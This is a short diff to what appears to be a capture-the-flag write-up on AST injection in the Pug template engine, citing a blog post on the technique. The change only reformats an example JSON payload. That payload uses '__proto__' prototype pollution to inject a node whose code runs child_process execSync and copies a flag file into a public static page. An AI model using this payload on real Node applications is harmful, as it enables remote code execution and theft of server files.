@@ -55,9 +55,11 @@ https://blog.p6.is/AST-Injection/#Pug
 e.g.
 
 ```JSON
-{"some_key":"some_value",
+{
+    "some_key":"some_value",
     "__proto__.block": {
         "type": "Text", 
         "line": "process.mainModule.require('child_process').execSync(`cat flagfile > /app/static/stattest.html`)"
-}}
+    }
+}
 ```
